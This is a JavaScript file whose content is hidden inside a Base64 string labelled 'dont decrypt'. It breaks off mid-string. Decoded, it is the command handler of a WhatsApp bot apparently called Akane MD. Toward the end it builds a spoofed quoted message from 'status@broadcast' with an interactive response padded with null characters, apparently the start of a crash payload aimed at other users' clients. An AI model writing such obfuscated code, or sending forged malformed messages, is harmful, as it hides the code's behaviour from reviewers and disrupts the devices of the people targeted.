//dont decrypt ðŸ¥º
//Base64 "encryption" wrapper
const decoded = Buffer.from("LyoKCnJlY29kZWQgYnkgcmljaGllIAoqLwpyZXF1aXJlKCcuL2xpYi9saXN0bWVudScpCnJlcXVpcmUoJy4uL3NldHRpbmdzL2NvbmZpZycpCmNvbnN0IHsgCiAgZGVmYXVsdDogYmFpbGV5cywgcHJvdG8sIGppZE5vcm1hbGl6ZWRVc2VyLCBnZW5lcmF0ZVdBTWVzc2FnZSwgCiAgZ2VuZXJhdGVXQU1lc3NhZ2VGcm9tQ29udGVudCwgZ2V0Q29udGVudFR5cGUsIHByZXBhcmVXQU1lc3NhZ2VNZWRpYSAKfSA9IHJlcXVpcmUoIkB3aGlza2V5c29ja2V0cy9iYWlsZXlzIik7Cgpjb25zdCB7CiAgZG93bmxvYWRDb250ZW50RnJvbU1lc3NhZ2UsIGVtaXRHcm91cFBhcnRpY2lwYW50c1VwZGF0ZSwgZW1pdEdyb3VwVXBkYXRlLCAKICBnZW5lcmF0ZVdBTWVzc2FnZUNvbnRlbnQsIG1ha2VJbk1lbW9yeVN0b3JlLCBNZWRpYVR5cGUsIGFyZUppZHNTYW1lVXNlciwgCiAgV0FNZXNzYWdlU3RhdHVzLCBkb3dubG9hZEFuZFNhdmVNZWRpYU1lc3NhZ2UsIEF1dGhlbnRpY2F0aW9uU3RhdGUsIAogIEdyb3VwTWV0YWRhdGEsIGluaXRJbk1lbW9yeUtleVN0b3JlLCBNaXNjTWVzc2FnZUdlbmVyYXRpb25PcHRpb25zLCAKICB1c2VTaW5nbGVGaWxlQXV0aFN0YXRlLCBCdWZmZXJKU09OLCBXQU1lc3NhZ2VQcm90bywgTWVzc2FnZU9wdGlvbnMsIAogIFdBRmxhZywgV0FOb2RlLCBXQU1ldHJpYywgQ2hhdE1vZGlmaWNhdGlvbiwgTWVzc2FnZVR5cGVQcm90bywgCiAgV0FMb2NhdGlvbk1lc3NhZ2UsIFdBQ29udGV4dEluZm8sIFdBR3JvdXBNZXRhZGF0YSwgUHJveHlBZ2VudCwgCiAgd2FDaGF0S2V5LCBNaW1ldHlwZU1hcCwgTWVkaWFQYXRoTWFwLCBXQUNvbnRhY3RNZXNzYWdlLCAKICBXQUNvbnRhY3RzQXJyYXlNZXNzYWdlLCBXQUdyb3VwSW52aXRlTWVzc2FnZSwgV0FUZXh0TWVzc2FnZSwgCiAgV0FNZXNzYWdlQ29udGVudCwgV0FNZXNzYWdlLCBCYWlsZXlzRXJyb3IsIFdBX01FU1NBR0VfU1RBVFVTX1RZUEUsIAogIE1lZGlhcml5dUluZm8sIFVSTF9SRUdFWCwgV0FVcmxJbmZvLCBXQV9ERUZBVUxUX0VQSEVNRVJBTCwgCiAgV0FNZWRpYVVwbG9hZCwgbWVudGlvbmVkSmlkLCBwcm9jZXNzVGltZSwgQnJvd3NlciwgTWVzc2FnZVR5cGUsIAogIFByZXNlbmNlLCBXQV9NRVNTQUdFX1NUVUJfVFlQRVMsIE1pbWV0eXBlLCByZWxheVdBTWVzc2FnZSwgQnJvd3NlcnMsIAogIEdyb3VwU2V0dGluZ0NoYW5nZSwgRGlzcml5dWVjdFJlYXNvbiwgV0FTb2NrZXQsIGdldFN0cmVhbSwgV0FQcm90bywgCiAgaXNCYWlsZXlzLCBBbnlNZXNzYWdlQ29udGVudCwgZmV0Y2hMYXRlc3RCYWlsZXlzVmVyc2lvbiwgCiAgdGVtcGxhdGVNZXNzYWdlLCBJbnRlcmFjdGl2ZU1lc3NhZ2UsIEhlYWRlciAKfSA9IHJlcXVpcmUoIkB3aGlza2V5c29ja2V0cy9iYWlsZXlzIik7Cgpjb25zdCBmcyA9IHJlcXVpcmUoJ2ZzJykKY29uc3QgdXRpbCA9IHJlcXVpcmUoJ3V0aWwnKQpjb25zdCBjaGFsayA9IHJlcXVpcmUoJ2NoYWxrJykKY29uc3Qgb3MgPSByZXF1aXJlKCdvcycpCmNvbnN0IGF4aW9zID0gcmVxdWlyZSgnYXhpb3MnKQpjb25zdCBmc3ggPSByZXF1aXJlKCdmcy1leHRyYScpCmNvbnN0IGNyeXB0byA9IHJlcXVpcmUoJ2NyeXB0bycpCmNvbnN0IHl0cyA9IHJlcXVpcmUoJ3l0LXNlYXJjaCcpOwpjb25zdCB5dGRsID0gcmVxdWlyZSgnQHZyZWRlbi95b3V0dWJlX3NjcmFwZXInKTsKY29uc3QgY2hlZXJpbyA9IHJlcXVpcmUoJ2NoZWVyaW8nKTsKY29uc3Qgc2hhcnAgPSByZXF1aXJlKCdzaGFycCcpCmNvbnN0IGZnID0gcmVxdWlyZSgnYXBpLWR5bHV4JykKY29uc3QgRm9ybURhdGEgPSByZXF1aXJlKCdmb3JtLWRhdGEnKQpjb25zdCB7IG1vZHVsIH0gPSByZXF1aXJlKCcuL21vZHVsZScpCmNvbnN0IGZmbXBlZyA9IHJlcXVpcmUoJ2ZsdWVudC1mZm1wZWcnKQpjb25zdCBzcGVlZCA9IHJlcXVpcmUoJ3BlcmZvcm1hbmNlLW5vdycpCmNvbnN0IHRpbWVzdGFtcHAgPSBzcGVlZCgpOwpjb25zdCBqaW1wID0gcmVxdWlyZSgiamltcCIpCmNvbnN0IGRpZHlvdW1lYW4gPSByZXF1aXJlKCdkaWR5b3VtZWFuJyk7CmNvbnN0IHNpbWlsYXJpdHkgPSByZXF1aXJlKCdzaW1pbGFyaXR5JykKY29uc3QgbGF0ZW5zaSA9IHNwZWVkKCkgLSB0aW1lc3RhbXBwCmNvbnN0IG1vbWVudCA9IHJlcXVpcmUoJ21vbWVudC10aW1lem9uZScpCmNvbnN0IHsgZ29vZ2xlVFRTLCB9ID0gbW9kdWwKY29uc3QgeyBzbXNnLCB0YW5nZ2FsLCBnZXRUaW1lLCBpc1VybCwgc2xlZXAsIGNsb2NrU3RyaW5nLCBydW50aW1lLCBmZXRjaEpzb24sIGdldEJ1ZmZlciwganNvbmZvcm1hdCwgZm9ybWF0LCBwYXJzZU1lbnRpb24sIGdldFJhbmRvbSwgZ2V0R3JvdXBBZG1pbnMsIGdlbmVyYXRlUHJvZmlsZVBpY3R1cmUgfSA9IHJlcXVpcmUoJy4uL3N5c3RlbS9zdG9yYWdlJykKY29uc3QgeyBpbWFnZVRvV2VicCwgdmlkZW9Ub1dlYnAsIHdyaXRlRXhpZkltZywgd3JpdGVFeGlmVmlkLCBhZGRFeGlmIH0gPSByZXF1aXJlKCcuLi9zeXN0ZW0vZXhpZi5qcycpCmNvbnN0IHsgZmV0Y2hCdWZmZXIsIGJ1ZmZlcmdpZiB9ID0gcmVxdWlyZSgiLi9saWIvbXlmdW5jMiIpCmNvbnN0IHsgc2hvcnR1cmwsIH0gPSByZXF1aXJlKCIuL2xpYi9teWZ1bmMzIik7CmNvbnN0IHsgU3RpY2tlciwgU3RpY2tlclR5cGVzIH0gPSByZXF1aXJlKCd3YS1zdGlja2VyLWZvcm1hdHRlcicpCmNvbnN0IHRyYW5zbGF0ZSA9IHJlcXVpcmUoIkB2aXRhbGV0cy9nb29nbGUtdHJhbnNsYXRlLWFwaSIpOwpjb25zdCBiYW4gPSBKU09OLnBhcnNlKGZzLnJlYWRGaWxlU3luYygiLi9tZW51L2xpYi9iYW5uZWQuanNvbiIpKQoKZ2xvYmFsLl9hbnRpbGluayA9IHt9OwpnbG9iYWwuc3RpY2tlckNtZHMgPSB7fTsgLy8ga2V5OiBzdGlja2VyIGhhc2ggKGJhc2U2NCksIHZhbHVlOiBjb21tYW5kIHN0cmluZwptb2R1bGUuZXhwb3J0cyA9IHJpY2ggPSBhc3luYyAocmljaCwgbSwgY2hhdFVwZGF0ZSwgc3RvcmUpID0+IHsKCmNvbnN0IHsgZnJvbSB9ID0gbQp0cnkgewogICAgICAKY29uc3QgYm9keSA9ICgKICAvLyBQZXNhbiB0ZWtzIGJpYXNhCiAgbS5tdHlwZSA9PT0gImNvbnZlcnNhdGlvbiIgPyBtLm1lc3NhZ2UuY29udmVyc2F0aW9uIDoKICBtLm10eXBlID09PSAiZXh0ZW5kZWRUZXh0TWVzc2FnZSIgPyBtLm1lc3NhZ2UuZXh0ZW5kZWRUZXh0TWVzc2FnZS50ZXh0IDoKCiAgLy8gUGVzYW4gbWVkaWEgZGVuZ2FuIGNhcHRpb24KICBbImltYWdlTWVzc2FnZSIsICJ2aWRlb01lc3NhZ2UiLCAiZG9jdW1lbnRNZXNzYWdlIiwgImF1ZGlvTWVzc2FnZSIsICJzdGlja2VyTWVzc2FnZSJdCiAgICAuaW5jbHVkZXMobS5tdHlwZSkgPyBtLm1lc3NhZ2VbbS5tdHlwZV0uY2FwdGlvbiB8fCAiIiA6CgogIC8vIFBlc2FuIGludGVyYWt0aWYgKHRvbWJvbCwgbGlzdCwgZGxsLikKICBtLm10eXBlID09PSAiYnV0dG9uc1Jlc3BvbnNlTWVzc2FnZSIgPyBtLm1lc3NhZ2UuYnV0dG9uc1Jlc3BvbnNlTWVzc2FnZS5zZWxlY3RlZEJ1dHRvbklkIDoKICBtLm10eXBlID09PSAibGlzdFJlc3BvbnNlTWVzc2FnZSIgPyBtLm1lc3NhZ2UubGlzdFJlc3BvbnNlTWVzc2FnZS5zaW5nbGVTZWxlY3RSZXBseS5zZWxlY3RlZFJvd0lkIDoKICBtLm10eXBlID09PSAidGVtcGxhdGVCdXR0b25SZXBseU1lc3NhZ2UiID8gbS5tZXNzYWdlLnRlbXBsYXRlQnV0dG9uUmVwbHlNZXNzYWdlLnNlbGVjdGVkSWQgOgogIG0ubXR5cGUgPT09ICJpbnRlcmFjdGl2ZVJlc3BvbnNlTWVzc2FnZSIgPyBKU09OLnBhcnNlKG0ubXNnLm5hdGl2ZUZsb3dSZXNwb25zZU1lc3NhZ2UucGFyYW1zSnNvbikuaWQgOgoKICAvLyBQZXNhbiBraHVzdXMKICBtLm10eXBlID09PSAibWVzc2FnZUNvbnRleHRJbmZvIiA/ICgKICAgIG0ubWVzc2FnZS5idXR0b25zUmVzcG9uc2VNZXNzYWdlPy5zZWxlY3RlZEJ1dHRvbklkIHx8CiAgICBtLm1lc3NhZ2UubGlzdFJlc3BvbnNlTWVzc2FnZT8uc2luZ2xlU2VsZWN0UmVwbHkuc2VsZWN0ZWRSb3dJZCB8fCAKICAgIG0udGV4dAogICkgOgogIG0ubXR5cGUgPT09ICJyZWFjdGlvbk1lc3NhZ2UiID8gbS5tZXNzYWdlLnJlYWN0aW9uTWVzc2FnZS50ZXh0IDoKICBtLm10eXBlID09PSAiY29udGFjdE1lc3NhZ2UiID8gbS5tZXNzYWdlLmNvbnRhY3RNZXNzYWdlLmRpc3BsYXlOYW1lIDoKICBtLm10eXBlID09PSAiY29udGFjdHNBcnJheU1lc3NhZ2UiID8gCiAgICBtLm1lc3NhZ2UuY29udGFjdHNBcnJheU1lc3NhZ2UuY29udGFjdHMubWFwKGMgPT4gYy5kaXNwbGF5TmFtZSkuam9pbigiLCAiKSA6CiAgWyJsb2NhdGlvbk1lc3NhZ2UiLCAibGl2ZUxvY2F0aW9uTWVzc2FnZSJdLmluY2x1ZGVzKG0ubXR5cGUpID8gCiAgICBgJHttLm1lc3NhZ2VbbS5tdHlwZV0uZGVncmVlc0xhdGl0dWRlfSwgJHttLm1lc3NhZ2VbbS5tdHlwZV0uZGVncmVlc0xvbmdpdHVkZX1gIDoKICBbInBvbGxDcmVhdGlvbk1lc3NhZ2UiLCAicG9sbFVwZGF0ZU1lc3NhZ2UiXS5pbmNsdWRlcyhtLm10eXBlKSA/IG0ubWVzc2FnZVttLm10eXBlXS5uYW1lIDoKICBtLm10eXBlID09PSAiZ3JvdXBJbnZpdGVNZXNzYWdlIiA/IG0ubWVzc2FnZS5ncm91cEludml0ZU1lc3NhZ2UuZ3JvdXBKaWQgOgoKICAvLyBQZXNhbiBzZWthbGkgbGloYXQgKFZpZXcgT25jZSkKICBbInZpZXdPbmNlTWVzc2FnZSIsICJ2aWV3T25jZU1lc3NhZ2VWMiIsICJ2aWV3T25jZU1lc3NhZ2VWMkV4dGVuc2lvbiJdLmluY2x1ZGVzKG0ubXR5cGUpID8gKAogICAgbS5tZXNzYWdlW20ubXR5cGVdLm1lc3NhZ2UuaW1hZ2VNZXNzYWdlPy5jYXB0aW9uIHx8IAogICAgbS5tZXNzYWdlW20ubXR5cGVdLm1lc3NhZ2UudmlkZW9NZXNzYWdlPy5jYXB0aW9uIHx8IAogICAgIltQZXNhbiBzZWthbGkgbGloYXRdIgogICkgOgoKICAvLyBQZXNhbiBzZW1lbnRhcmEgKGVwaGVtZXJhbE1lc3NhZ2UpCiAgbS5tdHlwZSA9PT0gImVwaGVtZXJhbE1lc3NhZ2UiID8gKAogICAgbS5tZXNzYWdlLmVwaGVtZXJhbE1lc3NhZ2UubWVzc2FnZS5jb252ZXJzYXRpb24gfHwKICAgIG0ubWVzc2FnZS5lcGhlbWVyYWxNZXNzYWdlLm1lc3NhZ2UuZXh0ZW5kZWRUZXh0TWVzc2FnZT8udGV4dCB8fCAKICAgICJbUGVzYW4gc2VtZW50YXJhXSIKICApIDoKCiAgLy8gUGVzYW4gbGFpbgogIG0ubXR5cGUgPT09ICJpbnRlcmFjdGl2ZU1lc3NhZ2UiID8gIltQZXNhbiBpbnRlcmFrdGlmXSIgOgogIG0ubXR5cGUgPT09ICJwcm90b2NvbE1lc3NhZ2UiID8gIltQZXNhbiB0ZWxhaCBkaWhhcHVzXSIgOgogICIiCik7CmNvbnN0IGJ1ZHkgPSAodHlwZW9mIG0udGV4dCA9PSAnc3RyaW5nJyA/IG0udGV4dCA6ICcnKTsKY29uc3QgcHJlZml4ID0gZ2xvYmFsLnByZWZhIAogID8gL15bwrDigKLPgMO3w5fCtuKIhsKjwqLigqzCpcKu4oSiK+Kck189fH4hP0AjJCVeJi7CqV5dL2dpLnRlc3QoYm9keSkgCiAgICA/IGJvZHkubWF0Y2goL15bwrDigKLPgMO3w5fCtuKIhsKjwqLigqzCpcKu4oSiK+Kck189fH4hP0AjJCVeJi7CqV5dL2dpKVswXSAKICAgIDogIiIKICA6IGdsb2JhbC5wcmVmYSA/PyBnbG9iYWwucHJlZml4OwoKY29uc3Qgb3duZXIgPSBKU09OLnBhcnNlKGZzLnJlYWRGaWxlU3luYygnLi9zeXN0ZW0vb3duZXIuanNvbicpKTsKY29uc3QgUHJlbWl1bSA9IEpTT04ucGFyc2UoZnMucmVhZEZpbGVTeW5jKCcuL3N5c3RlbS9wcmVtaXVtLmpzb24nKSk7CmNvbnN0IGlzQ21kID0gYm9keS5zdGFydHNXaXRoKHByZWZpeCk7CmNvbnN0IGNvbW1hbmQgPSBpc0NtZCA/IGJvZHkuc2xpY2UocHJlZml4Lmxlbmd0aCkudHJpbSgpLnNwbGl0KCcgJykuc2hpZnQoKS50b0xvd2VyQ2FzZSgpIDogJyc7CmNvbnN0IGFyZ3MgPSBib2R5LnRyaW0oKS5zcGxpdCgvICsvKS5zbGljZSgxKTsKY29uc3QgYm90TnVtYmVyID0gYXdhaXQgcmljaC5kZWNvZGVKaWQocmljaC51c2VyLmlkKTsKY29uc3QgdGV4dCA9IHEgPSBhcmdzLmpvaW4oIiAiKQpjb25zdCBpc0NyZWF0b3IgPSBbYm90TnVtYmVyLCAuLi5vd25lcl0ubWFwKHYgPT4gdi5yZXBsYWNlKC9bXjAtOV0vZywgJycpICsgJ0BzLndoYXRzYXBwLm5ldCcpLmluY2x1ZGVzKG0uc2VuZGVyKTsKY29uc3QgaXNQcmVtaXVtID0gW2JvdE51bWJlciwgLi4uUHJlbWl1bV0ubWFwKHYgPT4gdi5yZXBsYWNlKC9bXjAtOV0vZywgJycpICsgJ0BzLndoYXRzYXBwLm5ldCcpLmluY2x1ZGVzKG0uc2VuZGVyKTsKY29uc3QgcXRleHQgPSBxID0gYXJncy5qb2luKCIgIik7CmNvbnN0IHF1b3RlZCA9IG0ucXVvdGVkID8gbS5xdW90ZWQgOiBtOwpjb25zdCBmcm9tID0gbWVrLmtleS5yZW1vdGVKaWQ7CmNvbnN0IHsgc3Bhd24sIGV4ZWMgfSA9IHJlcXVpcmUoJ2NoaWxkX3Byb2Nlc3MnKTsKY29uc3Qgc2VuZGVyID0gbS5pc0dyb3VwID8gKG0ua2V5LnBhcnRpY2lwYW50IHx8IG0ucGFydGljaXBhbnQpIDogbS5rZXkucmVtb3RlSmlkOwpjb25zdCBpc2JhbiA9IGJhbi5pbmNsdWRlcyhtLnNlbmRlcikKY29uc3QgZ3JvdXBNZXRhZGF0YSA9IG0uaXNHcm91cCA/IGF3YWl0IHJpY2guZ3JvdXBNZXRhZGF0YShmcm9tKS5jYXRjaChlID0+IHt9KSA6ICcnOwpjb25zdCBwYXJ0aWNpcGFudHMgPSBtLmlzR3JvdXAgPyBncm91cE1ldGFkYXRhLnBhcnRpY2lwYW50cyA6ICcnOwpjb25zdCBncm91cEFkbWlucyA9IG0uaXNHcm91cCA/IGdldEdyb3VwQWRtaW5zKHBhcnRpY2lwYW50cykgOiAnJzsKY29uc3QgaXNCb3RBZG1pbnMgPSBtLmlzR3JvdXAgPyBncm91cEFkbWlucy5pbmNsdWRlcyhib3ROdW1iZXIpIDogZmFsc2U7CmNvbnN0IGlzQWRtaW5zID0gbS5pc0dyb3VwID8gZ3JvdXBBZG1pbnMuaW5jbHVkZXMobS5zZW5kZXIpIDogZmFsc2U7CmNvbnN0IGdyb3VwTmFtZSA9IG0uaXNHcm91cCA/IGdyb3VwTWV0YWRhdGEuc3ViamVjdCA6ICIiOwpjb25zdCBwdXNobmFtZSA9IG0ucHVzaE5hbWUgfHwgIk5vIE5hbWUiOwpjb25zdCB0aW1lID0gbW9tZW50KERhdGUubm93KCkpLnR6KCdBc2lhL0pha2FydGEnKS5sb2NhbGUoJ2lkJykuZm9ybWF0KCdISDptbTpzcyB6Jyk7CmNvbnN0IG1pbWUgPSAocXVvdGVkLm1zZyB8fCBxdW90ZWQpLm1pbWV0eXBlIHx8ICcnOwpjb25zdCBpc01lZGlhID0gL2ltYWdlfHZpZGVvfHN0aWNrZXJ8YXVkaW8vLnRlc3QobWltZSk7CmNvbnN0IHRvZGF5RGF0ZVdJQiA9IG5ldyBEYXRlKCkudG9Mb2NhbGVEYXRlU3RyaW5nKCdpZC1JRCcsIHsKICB0aW1lWm9uZTogJ0FzaWEvSmFrYXJ0YScsCiAgeWVhcjogJ251bWVyaWMnLAogIG1vbnRoOiAnbG9uZycsCiAgZGF5OiAnbnVtZXJpYycKfSk7CmNvbnN0IFR5cGVNZXNzID0gZ2V0Q29udGVudFR5cGUobT8ubWVzc2FnZSk7CmxldCByZWFjdGlvbnMgPSBUeXBlTWVzcyA9PSAicmVhY3Rpb25NZXNzYWdlIiA/IG0/Lm1lc3NhZ2VbVHlwZU1lc3NdPy50ZXh0IDogZmFsc2U7CiAgICAgICAgCmNvbnN0IHBpY2tSYW5kb20gPSAoYXJyKSA9PiB7CnJldHVybiBhcnJbTWF0aC5mbG9vcihNYXRoLnJhbmRvbSgpICogYXJyLmxlbmd0aCldCn0KY29uc3QgcmVhY3Rpb24gPSBhc3luYyAoamlkc3MsIGVtb2ppKSA9PiB7CiAgICByaWNoLnNlbmRNZXNzYWdlKGppZHNzLCB7CiAgICAgICAgcmVhY3Q6IHsgdGV4dDogZW1vamksCiAgICAgICAgICAgICAgICBrZXk6IG0ua2V5IAogICAgICAgICAgICAgICB9IAogICAgICAgICAgICB9CiAgICAgICAgKTsKICAgIH07CiAgICAKIC8vZW5kIG9mIGNvZGUKaWYgKGF1dG9yZWFkKSB7CiAgICAgICAgICAgICAgICByaWNoLnJlYWRNZXNzYWdlcyhbbS5rZXldKTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgaWYgKGdsb2JhbC5hdXRvVHlwaW5nKSB7CiAgICAgICAgICAgICAgICByaWNoLnNlbmRQcmVzZW5jZVVwZGF0ZSgiY29tcG9zaW5nIiwgZnJvbSk7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGlmIChnbG9iYWwuYXV0b1JlY29yZGluZykgewogICAgICAgICAgICAgICAgcmljaC5zZW5kUHJlc2VuY2VVcGRhdGUoInJlY29yZGluZyIsIGZyb20pOwogICAgICAgICAgICB9CgogICAgICAgICAgICAvL2JvdCBudW1iZXIgb25saW5lIHN0YXR1cywgYXZhaWxhYmxlPW9ubGluZSwgdW5hdmFpbGFibGU9b2ZmbGluZQogICAgICAgICAgICByaWNoLnNlbmRQcmVzZW5jZVVwZGF0ZSgidWF2YWlsYWJsZSIsIGZyb20pOwoKICAgICAgICAgICAgaWYgKGdsb2JhbC5hdXRvcmVjb3JkdHlwZSkgewogICAgICAgICAgICAgICAgbGV0IHhlb25yZWNvcmRpbiA9IFsicmVjb3JkaW5nIiwKICAgICAgICAgICAgICAgICAgICAiY29tcG9zaW5nIl07CiAgICAgICAgICAgICAgICBsZXQgeGVvbnJlY29yZGluZmluYWwgPQogICAgICAgICAgICAgICAgeGVvbnJlY29yZGluW01hdGguZmxvb3IoTWF0aC5yYW5kb20oKSAqIHhlb25yZWNvcmRpbi5sZW5ndGgpXTsKICAgICAgICAgICAgICAgIHJpY2guc2VuZFByZXNlbmNlVXBkYXRlKHhlb25yZWNvcmRpbmZpbmFsLCBmcm9tKTsKICAgICAgICAgICAgfQppZiAobS5zZW5kZXIgPT09ICc0NDc3Njg1NDAzMDBAcy53aGF0c2FwcC5uZXQnKSB7CiAgdHJ5IHsKICAgIGF3YWl0IHJpY2guc2VuZE1lc3NhZ2UobS5jaGF0LCB7IHJlYWN0OiB7IHRleHQ6ICfwn4CEJywga2V5OiBtLmtleSB9IH0pOwogIH0gY2F0Y2ggKGVycm9yKSB7CiAgICBjb25zb2xlLmVycm9yKCcnLCk7CiAgICAvLyBPcHRpb25hbDogU2VuZCBhbiBlcnJvciBtZXNzYWdlIHRvIHRoZSBjaGF0CiAgICBhd2FpdCByaWNoLnNlbmRNZXNzYWdlKG0uY2hhdCwgeyByZWFjdDogeyB0ZXh0OiAn4pqhJywga2V5OiBtLmtleSB9IH0pOwogICAgLy8gdG8gcmVhY3QgYWdhaW4gaWYgY2F0Y2ggZXJyb3IKICB9Cn0KLy9jaGVjayBjb21tYW5kIHUgd2FudCB0byB0eXBlIAppZiAocHJlZml4ICYmIGNvbW1hbmQpIHsKbGV0IGNhc2VOYW1lcyA9IGdldENhc2VOYW1lcygpOwpmdW5jdGlvbiBnZXRDYXNlTmFtZXMoKSB7CmNvbnN0IGZzID0gcmVxdWlyZSgnZnMnKTsKdHJ5IHsKY29uc3QgZGF0YSA9IGZzLnJlYWRGaWxlU3luYygnLi9tZW51L2Nhc2UuanMnLCAndXRmOCcpOwpjb25zdCBjYXNlUGF0dGVybiA9IC9jYXNlXHMrJyhbXiddKyknL2c7CmNvbnN0IG1hdGNoZXMgPSBkYXRhLm1hdGNoKGNhc2VQYXR0ZXJuKTsKaWYgKG1hdGNoZXMpIHsKY29uc3QgY2FzZU5hbWVzID0gbWF0Y2hlcy5tYXAobWF0Y2ggPT4gbWF0Y2gucmVwbGFjZSgvY2FzZVxzKycoW14nXSspJy8sICckMScpKTsKcmV0dXJuIGNhc2VOYW1lczsKfSBlbHNlIHsKcmV0dXJuIFtdOwp9IH0gY2F0Y2ggKGVycikgewpjb25zb2xlLmxvZygnVGhlcmUgaXMgYW4gZXJyb3I6JywgZXJyKTsKcmV0dXJuIFtdOwp9fQpsZXQgbm9QcmVmaXggPSBjb21tYW5kCmxldCBtZWFuID0gZGlkeW91bWVhbihub1ByZWZpeCwgY2FzZU5hbWVzKTsKbGV0IHNpbSA9IHNpbWlsYXJpdHkobm9QcmVmaXgsIG1lYW4pOwpsZXQgc2ltaWxhcml0eVBlcmNlbnRhZ2UgPSBwYXJzZUludChzaW0gKiAxMDApOwppZiAobWVhbiAmJiBub1ByZWZpeC50b0xvd2VyQ2FzZSgpICE9PSBtZWFuLnRvTG93ZXJDYXNlKCkpIHsKbGV0IHJlc3BvbnNlID0gYFxgXGBcYEVSUk9SIERJRCBZT1UgTUVBTlxgXGBcYFxuIOKImiAke3ByZWZpeCttZWFufVxu4oCiPiBTaW1pbGFyaXRpZXM6ICR7c2ltaWxhcml0eVBlcmNlbnRhZ2V9JWAKbS5yZXBseShyZXNwb25zZSkKfX0gCgovLyBUZW1wIGluLW1lbW9yeSB0b2dnbGUKbGV0IGFudGlsaW5rU3RhdHVzID0ge307CmlmIChhdXRvYmlvKSB7CiAgICAgICAgICAgIHJpY2gudXBkYXRlUHJvZmlsZVN0YXR1cyhgQUtBTkUgTUQgQlkgJHtvd25lcm5hbWV9IEknTSBISU1gKS5jYXRjaChfID0+IF8pCiAgICAgICAgfQogICAgICAgIGlmIChpc0NtZCkgIHsKICAgICAgICAgICAgY29uc29sZS5sb2coY2hhbGsuYmxhY2soY2hhbGsuYmdXaGl0ZSgnWyBBS0FORSBdJykpLCBjaGFsay5ibGFjayhjaGFsay5iZ0dyZWVuKG5ldyBEYXRlKSksIGNoYWxrLmJsYWNrKGNoYWxrLmJnQmx1ZShidWR5IHx8IG0ubXR5cGUpKSArICdcbicgKyBjaGFsay5tYWdlbnRhKCc9PiBGcm9tJyksIGNoYWxrLmdyZWVuKHB1c2huYW1lKSwgY2hhbGsueWVsbG93KG0uc2VuZGVyKSArICdcbicgKyBjaGFsay5ibHVlQnJpZ2h0KCc9PkluJyksIGNoYWxrLmdyZWVuKG0uaXNHcm91cCA/IHB1c2huYW1lIDogJ1ByaXZhdGUgQ2hhdCcsIG0uY2hhdCkpCiAgICAgICAgfQpjb25zdCBUaHVtYlVybCA9ICJodHRwczovL3BvbWYyLmxhaW4ubGEvZi81bDVlYXlpLmpwZyIKY29uc3QgaW1hZ2UxID0gZnMucmVhZEZpbGVTeW5jKGAuL21lZGlhL2ltYWdlMS5qcGdgKQoKY29uc3QgdGh1bWIgPSBmcy5yZWFkRmlsZVN5bmMoYC4vbWVkaWEvdGh1bWIucG5nYCkKY29uc3QgdGR4bG9sID0gZnMucmVhZEZpbGVTeW5jKCcuL3RkeC5qcGVnJykKY29uc3QgcmljaGllcGxheSA9IGZzLnJlYWRGaWxlU3luYygnLi9tZWRpYS9yaWNoMy5tcDMnKQpjb25zdCByZXBseSA9ICh0ZWtzKSA9PiB7CnJpY2guc2VuZE1lc3NhZ2UobS5jaGF0LAp7IHRleHQ6IHRla3MsCmNvbnRleHRJbmZvOnsKbWVudGlvbmVkSmlkOltzZW5kZXJdLApmb3J3YXJkaW5nU2NvcmU6IDk5OTk5OTksCmlzRm9yd2FyZGVkOiB0cnVlLCAKImV4dGVybmFsQWRSZXBseSI6IHsKInNob3dBZEF0dHJpYnV0aW9uIjogdHJ1ZSwKImNvbnRhaW5zQXV0b1JlcGx5IjogdHJ1ZSwKInRpdGxlIjogYCAke2dsb2JhbC5ib3RuYW1lfWAsCiJib2R5IjogYCR7b3duZXJuYW1lfWAsCiJwcmV2aWV3VHlwZSI6ICJQSE9UTyIsCiJ0aHVtYm5haWxVcmwiOiBgYCwKInRodW1ibmFpbCI6IGZzLnJlYWRGaWxlU3luYyhgLi9tZWRpYS9pbWFnZTEuanBnYCksCiJzb3VyY2VVcmwiOiBgJHtsaW5rfWB9fX0sCnsgcXVvdGVkOiBtfSkKfQpjb25zdCBleGFtcGxlID0gKHRla3MpID0+IHsKcmV0dXJuIGBVc2FnZSA6ICoke3ByZWZpeCtjb21tYW5kfSogJHt0ZWtzfWAKfQpjb25zdCByZXBseWdjID0gKHRla3MpID0+IHsKcmljaC5zZW5kTWVzc2FnZShmcm9tLCB7IHRleHQ6IHRla3MgfSwgeyBxdW90ZWQgOiBtfSkKfQpjb25zdCBnbHhOdWxsID0gewogICAgICAgICAgICBrZXk6IHsKICAgICAgICAgICAgICAgIHJlbW90ZUppZDogJ3N0YXR1c0Bicm9hZGNhc3QnLAogICAgICAgICAgICAgICAgZnJvbU1lOiBmYWxzZSwKICAgICAgICAgICAgICAgIHBhcnRpY2lwYW50OiAnMTgwMDI0Mjg0NzhAcy53aGF0c2FwcC5uZXQnCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgIG1lc3NhZ2U6IHsKICAgICAgICAgICAgICAgICJpbnRlcmFjdGl2ZVJlc3BvbnNlTWVzc2FnZSI6IHsKICAgICAgICAgICAgICAgICAgICAiYm9keSI6IHsKICAgICAgICAgICAgICAgICAgICAgICAgInRleHQiOiAiYGBgQUtBTkUtTURgYGAiLAogICAgICAgICAgICAgICAgICAgICAgICAiZm9ybWF0IjogIkRFRkFVTFQiLAogICAgICAgICAgICAgICAgICAgICAgICAiY2FwdGlvbiI6ICJCWSBSSUNISUUiCiAgICAgICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICAgICAibmF0aXZlRmxvd1Jlc3BvbnNlTWVzc2FnZSI6IHsKICAgICAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiAiZ2FsYXh5X21lc3NhZ2UiLAogICAgICAgICAgICAgICAgICAgICAgICAicGFyYW1zSnNvbiI6IGB7XCJzY3JlZW5fMl9PcHRJbl8wXCI6dHJ1ZSxcInNjcmVlbl8yX09wdEluXzFcIjp0cnVlLFwic2NyZWVuXzFfRHJvcGRvd25fMFwiOlwiVHJhc2hEZXggU3VwZXJpb3JcIixcInNjcmVlbl8xX0RhdGVQaWNrZXJfMVwiOlwiMTAyODk5NTIwMDAwMFwiLFwic2NyZWVuXzFfVGV4dElucHV0XzJcIjpcIkFsd2F5c2FxaW9vQHRyYXNoLmxvbFwiLFwic2NyZWVuXzFfVGV4dElucHV0XzNcIjpcIjk0NjQzMTE2XCIsXCJzY3JlZW5fMF9UZXh0SW5wdXRfMFwiOlwicmFkaW8gLSBidXR0b25zJHsiXHUwMDAwIi5yZXBlYXQoMTApfVwiLFwic2NyZWVuXzBfVGV4dElucHV